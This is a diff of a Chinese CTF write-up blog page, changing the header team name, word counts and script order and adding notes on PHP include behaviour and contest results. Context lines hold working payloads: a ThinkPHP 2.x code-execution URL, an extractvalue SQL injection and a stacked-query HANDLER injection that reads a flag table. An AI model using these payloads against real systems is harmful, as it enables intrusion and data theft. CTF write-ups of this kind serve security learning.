@@ -373,7 +373,7 @@
         <div class="logo-name">Yn8rt</div>
         <div class="logo-desc">
             
-            山司 | 信息安全专业 | 网络安全
+            山司 | 信息安全专业 | 星盟天汉安全团队
             
         </div>
     </div>
@@ -880,7 +880,7 @@
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        10.9k
+                        11k
                     </div>
                     
 
@@ -985,6 +985,8 @@
 <p>因为source与hint都在whitelist的白名单里面，这里就是类似于将这个题目定向</p>
 <p>没什么东西</p>
 <p>flag{7c4ca688-51e1-4235-958a-fad970c48f7b}</p>
+<p>回头补充：</p>
+<p>include函数有这么一个神奇的功能：以字符‘/’分隔（而且不计个数），若是在前面的字符串所代表的文件无法被PHP找到，则PHP会自动包含‘/’后面的文件——注意是最后一个‘/’。</p>
 <h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><p>输入1得</p>
 <pre><code>array(2) {
   [0]=&gt;
@@ -1794,16 +1796,17 @@ print(flag)</code></pre><h3 id="脚本的解释："><a href="#脚本的解释：
 <h4 id="if-“Hello”-in-s-text"><a href="#if-“Hello”-in-s-text" class="headerlink" title="if “Hello” in s.text:"></a>if “Hello” in s.text:</h4><p>因为返回正确的时候才会显hello</p>
 <h2 id="ThinkPHP-2-Rce"><a href="#ThinkPHP-2-Rce" class="headerlink" title="[ThinkPHP]2-Rce"></a>[ThinkPHP]2-Rce</h2><p>ThinkPHP 2.x 的任意代码执行漏洞</p>
 <p>题目：</p>
-<pre><code>示例源码
+<pre class="line-numbers language-php"><code class="language-php">示例源码
 控制器IndexAction类
-&lt;?php
-class IndexAction extends Action{
-    public function index() {
-        $this-&gt;assign(&#39;hello&#39;,&#39;Hello,ThinkPHP&#39;);
-        $this-&gt;display();
-    }
-}
-?&gt; </code></pre><p>payload：</p>
+<span class="token delimiter">&lt;?php</span>
+<span class="token keyword">class</span> <span class="token class-name">IndexAction</span> <span class="token keyword">extends</span> <span class="token class-name">Action</span><span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">assign</span><span class="token punctuation">(</span><span class="token string">'hello'</span><span class="token punctuation">,</span><span class="token string">'Hello,ThinkPHP'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">display</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token delimiter">?></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>payload：</p>
 <pre><code>?s=/Index/index/L/${@phpinfo()}</code></pre><h1 id="2021-4-24"><a href="#2021-4-24" class="headerlink" title="2021-4-24"></a>2021-4-24</h1><h2 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h2><p>知识点：</p>
 <p>1.联合查询</p>
 <p>2.php反序列化</p>
@@ -2136,8 +2139,9 @@ union/**/select
 <pre><code>-1&#39; or extractvalue(1,concat(&#39;~&#39;,database()))#</code></pre><p>新考点学习：<a href="https://blog.csdn.net/JesseYoung/article/details/40785137" target="_blank" rel="noopener">mysql中的HANDLER … OPEN语句</a></p>
 <p>payload：</p>
 <pre><code>1&#39;;use supersqli;handler FlagHere open;handler FlagHere read first;handler FlagHere close;</code></pre><p>得到flag</p>
-<h1 id="2021-04-29"><a href="#2021-04-29" class="headerlink" title="2021-04-29"></a>2021-04-29</h1><p>蓝帽杯</p>
-<h1 id="2021-04-30"><a href="#2021-04-30" class="headerlink" title="2021-04-30"></a>2021-04-30</h1><p>转战ctfhub</p>
+<h1 id="2021-04-29"><a href="#2021-04-29" class="headerlink" title="2021-04-29"></a>2021-04-29</h1><p>蓝帽杯：全国排名123（模糊）北部战区66名，山东20</p>
+<p>解出题目：misc1+web1</p>
+<h1 id="2021-04-30"><a href="#2021-04-30" class="headerlink" title="2021-04-30"></a>2021-04-30</h1><p>进入星盟安全的天汉安全团队，因为要通过战队考核期故而转战CTFHUB</p>
 
             </div>
             <hr/>
@@ -2864,7 +2868,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
 
             
                 &nbsp; | &nbsp;字数统计:&nbsp;
-                <span class="white-color">79.7k</span> 字
+                <span class="white-color">92.6k</span> 字
             
 
             
@@ -3092,10 +3096,10 @@ $(function () {
   </script>
         
 
-    <script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"live2d-widget-model-shizuku"},"display":{"position":"left","width":150,"height":200},"mobile":{"show":false},"react":{"opacity":0.7}});</script><script>
+    <script>
             window.imageLazyLoadSetting = {
                 isSPA: false,
                 processImages: null,
             };
-        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>!function(n){n.imageLazyLoadSetting.processImages=i;var e=n.imageLazyLoadSetting.isSPA,r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function i(){e&&(r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")));for(var t,a=0;a<r.length;a++)0<=(t=(t=r[a]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(n.innerHeight||document.documentElement.clientHeight)&&function(){var t,e,n,i,o=r[a];t=o,e=function(){r=r.filter(function(t){return o!==t})},n=new Image,i=t.getAttribute("data-original"),n.onload=function(){t.src=i,e&&e()},n.src=i}()}i(),n.addEventListener("scroll",function(){var t,e;t=i,e=n,clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(e)},500)})}(this);</script></body>
+        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>!function(n){n.imageLazyLoadSetting.processImages=i;var e=n.imageLazyLoadSetting.isSPA,r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function i(){e&&(r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")));for(var t,a=0;a<r.length;a++)0<=(t=(t=r[a]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(n.innerHeight||document.documentElement.clientHeight)&&function(){var t,e,n,i,o=r[a];t=o,e=function(){r=r.filter(function(t){return o!==t})},n=new Image,i=t.getAttribute("data-original"),n.onload=function(){t.src=i,e&&e()},n.src=i}()}i(),n.addEventListener("scroll",function(){var t,e;t=i,e=n,clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(e)},500)})}(this);</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"live2d-widget-model-shizuku"},"display":{"position":"left","width":150,"height":200},"mobile":{"show":false},"react":{"opacity":0.7}});</script></body>
 </html>
